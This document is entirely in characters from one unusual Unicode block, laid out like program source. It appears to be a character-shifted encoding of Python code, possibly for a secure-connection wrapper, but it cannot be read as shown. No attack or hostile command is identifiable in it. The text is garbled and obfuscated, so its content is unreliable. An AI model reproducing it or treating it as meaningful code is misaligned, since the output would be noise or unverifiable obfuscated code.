꛽꛻꛺꛾꛰ꚷꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚕꚫꚫꚫꚫꚮꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛾꛰꛿꛾ꚫꛚꛛꛪꛙꛚꛪꛞꛞꛗ꜁ꚽꚷꚫꛚꛛꛪꛙꛚꛪꛞꛞꛗ꜁ꚾꚷꚫꛚꛛꛪꛙꛚꛪꛎꛚꛘꛛꛝꛐꛞꛞꛔꛚꛙꚷꚕꚫꚫꚫꚫꚮꚫꛚꛛꛪꛎꛔꛛꛓꛐꛝꛪꛞꛐꛝꛡꛐꛝꛪꛛꛝꛐꛑꛐꛝꛐꛙꛎꛐꚷꚫꛚꛛꛪꛞꛔꛙꛒꛗꛐꛪꛏꛓꛪꛠꛞꛐꚫꛬ꛹ꛯꚫꛚꛛꛪꛞꛔꛙꛒꛗꛐꛪꛐꛎꛏꛓꛪꛠꛞꛐꚕꚫꚫꚫꚫꚮꚫꛭ꜄ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚹꚕꚫꚫꚫꚫ꛴꛱ꚫ꛻꜀꛽꛻꛺꛾꛰ꚫꛈꛈꚫꛛ꜀꛽꛻꛺꛾꛰ꚹꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꜁꛰꛽꛴꛱꜄ꚫꛮ꛰꛽꛿꛾ꚫꛬ꛹ꛯꚫ꛳꛺꛾꛿ꚫ꛹ꛬ꛸꛰ꚫ꛴꛹ꚫꛮ꛷꛴꛰꛹꛿ꚫ꛸꛺ꛯ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛈꚫꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛎꛗꛔꛐꛙꛟꚕꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛻꜀꛽꛻꛺꛾꛰ꚫꛈꛈꚫꛛ꜀꛽꛻꛺꛾꛰ꚹꛎꛗꛔꛐꛙꛟꛪꛌꛠꛟꛓꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛈꚫꛛꛝꛚꛟꛚꛎꛚꛗꛪꛟꛗꛞꛪꛞꛐꛝꛡꛐꛝꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚕꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚴꚕꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛈꚫꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚕꚫꚫꚫꚫ꛴꛱ꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚫꛈꚫꛮ꛰꛽꛿ꛪ꛽꛰꛼꛾ꚕꚫꚫꚫꚫ꛴꛱ꚫꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛈꚫꛟ꛽꜀꛰ꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄꛱꛴꛷꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛮ꛰꛽꛿꛱꛴꛷꛰ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚭꚴꚕꚫꚫꚫꚫ꛴꛱ꚫꛮ꛰꛽꛿꛱꛴꛷꛰ꚫ꛺꛽ꚫ꛶꛰꜄꛱꛴꛷꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪꛮ꛰꛽꛿ꛪꛮ꛳ꛬ꛴꛹ꚳꛮ꛰꛽꛿꛱꛴꛷꛰ꚷꚫ꛶꛰꜄꛱꛴꛷꛰ꚴꚕꚕꚫꚫꚫꚫꚮꚫ꛷꛺ꛬꛯꚫꛎꛌꚫ꛽꛺꛺꛿ꚫꛮ꛰꛽꛿꛾ꚕꚫꚫꚫꚫ꛴꛱ꚫꛮꛬ꛱꛴꛷꛰ꚫ꛺꛽ꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛺꛽ꚫꛮꛬꛯꛬ꛿ꛬꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪ꜁꛰꛽꛴꛱꜄ꛪ꛷꛺ꛮꛬ꛿꛴꛺꛹꛾ꚳꛮꛬ꛱꛴꛷꛰ꚷꚫꛮꛬ꛻ꛬ꛿꛳ꚷꚫꛮꛬꛯꛬ꛿ꛬꚴꚕꚫꚫꚫꚫ꛰꛷꛴꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꜁꛰꛽꛴꛱꜄ꛪ꛸꛺ꛯ꛰ꚫꚬꛈꚫꛎꛐꛝꛟꛪꛙꛚꛙꛐꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛹꛺ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿ꚫꛮꛬ꛱꛴꛷꛰ꚷꚫꛮꛬ꛻ꛬ꛿꛳ꚫ꛺꛽ꚫꛮꛬꛯꛬ꛿ꛬꚫꛭ꜀꛿ꚫ꛿꛳꛰ꚫ꜁꛰꛽꛴꛱꜄ꚫ꛸꛺ꛯ꛰ꚫ꛴꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛎꛐꛝꛟꛪꛚꛛꛟꛔꛚꛙꛌꛗꚫ꛺꛽ꚫꛎꛐꛝꛟꛪꛝꛐꛜꛠꛔꛝꛐꛏꚹꚫꛗ꛰꛿ꚲ꛾ꚫ꛿꛽꜄ꚫ꛿꛺ꚫ꛷꛺ꛬꛯꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛾꜄꛾꛿꛰꛸ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛽꛺꛺꛿ꚫꛎꛌꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚫ꛱꛺꛽ꚫ꛿꛳꛰ꚫ꛲꛴꜁꛰꛹ꚫ꛻꜀꛽꛻꛺꛾꛰ꚹꚫꛟ꛳꛴꛾ꚫ꛸ꛬ꜄ꚫ꛱ꛬ꛴꛷ꚫ꛾꛴꛷꛰꛹꛿꛷꜄ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛷꛺ꛬꛯꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛰꛽꛿꛾ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚫꚫꚫꚫꚮꚫꛚ꛻꛰꛹ꛞꛞꛗꚫꚼꚹꚼꚹꚼꚫ꛶꛰꜄꛷꛺꛲ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛮ꛺꛹꛿꛰꜃꛿ꚷꚫꚲ꛶꛰꜄꛷꛺꛲ꛪ꛱꛴꛷꛰꛹ꛬ꛸꛰ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚫꛈꚫ꛺꛾ꚹ꛰꛹꜁꛴꛽꛺꛹ꚹ꛲꛰꛿ꚳꚲꛞꛞꛗꛖꛐꛤꛗꛚꛒꛑꛔꛗꛐꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫ꛾꜄꛾ꚹ꛱꛷ꛬ꛲꛾ꚹ꛴꛲꛹꛺꛽꛰ꛪ꛰꛹꜁꛴꛽꛺꛹꛸꛰꛹꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꚹ꛶꛰꜄꛷꛺꛲ꛪ꛱꛴꛷꛰꛹ꛬ꛸꛰ꚫꛈꚫ꛶꛰꜄꛷꛺꛲꛱꛴꛷꛰ꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꚮꚫꛠ꛾꛰ꛯꚫꛭ꜄ꚫ꛳꛿꛿꛻ꚹꛮ꛷꛴꛰꛹꛿ꚫ꛴꛱ꚫ꛹꛺ꚫꛮ꛺꛹꛿꛰꜃꛿ꚫ꛴꛾ꚫ꛰꜃꛻꛷꛴ꛮ꛴꛿꛷꜄ꚫ꛻ꛬ꛾꛾꛰ꛯꚹꚕꛪꛮ꛽꛰ꛬ꛿꛰ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪ꛳꛿꛿꛻꛾ꛪꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛮ꛽꛰ꛬ꛿꛰ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꚕꚮꚫꛍꛬꛮ꛶꜂ꛬ꛽ꛯ꛾ꚫꛮ꛺꛸꛻ꛬ꛿꛴ꛭ꛴꛷꛴꛿꜄ꚫꛬ꛷꛴ꛬ꛾ꚷꚫ꛰꜁꛰꛹ꚫ꛿꛳꛺꜀꛲꛳ꚫ꛴꛿ꚲ꛾ꚫ꛹꛺꛿ꚫꛬꚫ꛻꜀ꛭ꛷꛴ꛮꚫ꛹ꛬ꛸꛰ꚹꚕꛪꛮ꛽꛰ꛬ꛿꛰ꛪ꛾꛿ꛯ꛷꛴ꛭꛪꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛪꛮ꛽꛰ꛬ꛿꛰ꛪ꜀꛹꜁꛰꛽꛴꛱꛴꛰ꛯꛪꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꛅꚕꚫꚫꚫꚫꚭꚭꚭꛟ꛳꛴꛾ꚫꛮ꛷ꛬ꛾꛾ꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛾ꚫꛬ꛹ꚫ꛴꛹꛿꛰꛽꛱ꛬꛮ꛰ꚫ꛺꛹ꚫ꛿꛺꛻ꚫ꛺꛱ꚫꛬꚫ꛷꛺꜂ꚸ꛷꛰꜁꛰꛷ꚫꛞꛞꛗꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛬ꛾ꚕꚫꚫꚫꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꚫꛭ꜄ꚫꛚ꛻꛰꛹ꛞꛞꛗꚹꚫꛟ꛳꛴꛾ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛮꛬ꛻꛿꜀꛽꛰꛾ꚫ꛿꛳꛰ꚫ꛾꛿ꛬ꛿꛰ꚫ꛺꛱ꚫꛬ꛹ꚫꛞꛞꛗꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꛭ꜀꛿ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꚫꛬ꛹꜄ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫꛔꛚꚫ꛴꛿꛾꛰꛷꛱ꚹꚫꛔꛚꚫ꛹꛰꛰ꛯ꛾ꚫ꛿꛺ꚫꛭ꛰ꚫ꛻꛰꛽꛱꛺꛽꛸꛰ꛯꚕꚫꚫꚫꚫ꛿꛳꛽꛺꜀꛲꛳ꚫ꛾꛰꛻ꛬ꛽ꛬ꛿꛰ꚫꚭꛍꛔꛚꚭꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚫ꜂꛳꛴ꛮ꛳ꚫꛬ꛽꛰ꚫꛚ꛻꛰꛹ꛞꛞꛗꚲ꛾ꚫꛔꛚꚫꛬꛭ꛾꛿꛽ꛬꛮ꛿꛴꛺꛹ꚫ꛷ꛬ꜄꛰꛽ꚹꚕꚕꚫꚫꚫꚫꛟ꛳꛴꛾ꚫꛮ꛷ꛬ꛾꛾ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛳ꛬ꜁꛰ꚫꛬꚫ꛻꜀ꛭ꛷꛴ꛮꚫꛮ꛺꛹꛾꛿꛽꜀ꛮ꛿꛺꛽ꚹꚫꛔ꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫꛬ꛽꛰ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚕꚫꚫꚫꚫꛫꛫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪꛭ꛴꛺ꛫꛫꚹꚫꛟ꛳꛴꛾ꚫꛮ꛷ꛬ꛾꛾ꚫ꛴꛾ꚫ꛿꜄꛻꛴ꛮꛬ꛷꛷꜄ꚫ꜀꛾꛰ꛯꚫꛭ꜄ꚫ꛱꛽ꛬ꛸꛰꜂꛺꛽꛶ꚫꛬ꜀꛿꛳꛺꛽꛾ꚕꚫꚫꚫꚫ꛿꛳ꛬ꛿ꚫ꜂ꛬ꛹꛿ꚫ꛿꛺ꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿ꚫꛬ꛾꜄꛹ꛮ꛳꛽꛺꛹꛺꜀꛾ꚫꛔꛚꚫ꛱꛺꛽ꚫꛞꛞꛗꚫ꛿꛳꛽꛺꜀꛲꛳ꚫ꛸꛰꛸꛺꛽꜄ꚫꛭ꜀꛱꛱꛰꛽꛾ꚹꚕꚕꚫꚫꚫꚫꛢ꛳꛰꛹ꚫꛮ꛺꛸꛻ꛬ꛽꛰ꛯꚫ꛿꛺ꚫꛫꛫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꛫꛫꚷꚫ꛿꛳꛴꛾ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛷ꛬꛮ꛶꛾ꚫ꛿꛳꛰ꚫ꛱꛺꛷꛷꛺꜂꛴꛹꛲ꚫ꛱꛰ꛬ꛿꜀꛽꛰꛾ꛅꚕꚕꚫꚫꚫꚫꚫꚵꚫꛌ꛹꜄ꚫ꛱꛺꛽꛸ꚫ꛺꛱ꚫ꛹꛰꛿꜂꛺꛽꛶ꚫꛔꛚꚷꚫ꛴꛹ꛮ꛷꜀ꛯ꛴꛹꛲ꚫ꛸꛰꛿꛳꛺ꛯ꛾ꚫ꛾꜀ꛮ꛳ꚫꛬ꛾ꚫꛫꛫ꛽꛰ꛮ꜁ꛫꛫꚫꛬ꛹ꛯꚫꛫꛫ꛾꛰꛹ꛯꛫꛫꚹꚕꚫꚫꚫꚫꚫꚵꚫꛟ꛳꛰ꚫꛫꛫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛫꛫꚫꛬ꛹ꛯꚫꛫꛫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛫꛫꚫ꛸ꛬꛮ꛳꛴꛹꛰꛽꜄ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꚭ꜆꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛹ꛬ꛸꛰ꛪꛪ꜈ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛳ꛬ꜁꛰ꚫꛬꚫ꛻꜀ꛭ꛷꛴ꛮꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꚭꛮ꛺꛹꛾꛿꛽꜀ꛮ꛿꛺꛽ꚹꚫꛔ꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫꛬ꛽꛰ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪꛭ꛴꛺ꚳꚴꚹꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫꛋꛮ꛷ꛬ꛾꛾꛸꛰꛿꛳꛺ꛯꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛮ꛽꛰ꛬ꛿꛰ꚳꛮ꛷꛾ꚷꚫ꛴꛹ꛮ꛺꛸꛴꛹꛲ꚷꚫ꛺꜀꛿꛲꛺꛴꛹꛲ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛑꛬ꛷꛾꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈꛙ꛺꛹꛰ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈꛙ꛺꛹꛰ꚷꚫꛮ꛺꛹꛿꛰꜃꛿ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚫꛈꚫꛮ꛷꛾ꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛪ꜂꛽ꛬ꛻ꛪꛭ꛴꛺ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛹ꛮ꛺꛸꛴꛹꛲ꚷꚫ꛺꜀꛿꛲꛺꛴꛹꛲ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛺꜂꛹꛰꛽ꛈ꛾꛰꛷꛱ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈ꛾꛰꛾꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚫꛈꚫ꛾꛾꛷꛺ꛭ꛵ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛳꛰ꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚫ꛿꛳ꛬ꛿ꚫ꛴꛾ꚫꛮ꜀꛽꛽꛰꛹꛿꛷꜄ꚫ꛴꛹ꚫ꜀꛾꛰ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛺꛹꛿꛰꜃꛿ꚕꚕꚫꚫꚫꚫꛋꛮ꛺꛹꛿꛰꜃꛿ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚳ꛾꛰꛷꛱ꚷꚫꛮ꛿꜃ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛺꛹꛿꛰꜃꛿ꚫꛈꚫꛮ꛿꜃ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛳꛰ꚫꛞꛞꛗꛞ꛰꛾꛾꛴꛺꛹ꚫ꛱꛺꛽ꚫꛮ꛷꛴꛰꛹꛿ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꚕꚕꚫꚫꚫꚫꛋ꛾꛰꛾꛾꛴꛺꛹ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꚫꛈꚫ꛾꛰꛾꛾꛴꛺꛹ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꛪ꛽꛰꜀꛾꛰ꛯꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢꛬ꛾ꚫ꛿꛳꛰ꚫꛮ꛷꛴꛰꛹꛿ꚫ꛾꛰꛾꛾꛴꛺꛹ꚫ꛽꛰꜀꛾꛰ꛯꚫꛯ꜀꛽꛴꛹꛲ꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛾꛾꛴꛺꛹ꛪ꛽꛰꜀꛾꛰ꛯꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢ꛳꛰꛿꛳꛰꛽ꚫ꛿꛳꛴꛾ꚫ꛴꛾ꚫꛬꚫ꛾꛰꛽꜁꛰꛽ꚸ꛾꛴ꛯ꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟ꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿꛷꜄ꚫ꛾꛰꛿ꚫ꛾꛰꛽꜁꛰꛽ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꚳ꛱꛺꛽ꚫꛞꛙꛔꚴꚷꚫ꛺꛽ꚫꛫꛫꛙ꛺꛹꛰ꛫꛫꚫ꛴꛱ꚫ꛹꛺ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛴꛾ꚫ꛾꛰꛿ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛽꛰ꛬꛯꚳ꛾꛰꛷꛱ꚷꚫ꛷꛰꛹ꛈꚼꚻꚽꚿꚷꚫꛭ꜀꛱꛱꛰꛽ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰ꛬꛯꚫ꜀꛻ꚫ꛿꛺ꚫꚲ꛷꛰꛹ꚲꚫꛭ꜄꛿꛰꛾ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫꛞꛞꛗꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰꛸ꚹꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛔ꛱ꚫꚲꛭ꜀꛱꛱꛰꛽ꚲꚫ꛴꛾ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚷꚫ꛽꛰ꛬꛯꚫ꛴꛹꛿꛺ꚫ꛿꛳꛴꛾ꚫꛭ꜀꛱꛱꛰꛽ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜄꛿꛰꛾ꚫ꛽꛰ꛬꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛭ꜀꛱꛱꛰꛽ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜁ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛽꛰ꛬꛯꚳ꛷꛰꛹ꚷꚫꛭ꜀꛱꛱꛰꛽ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜁ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛽꛰ꛬ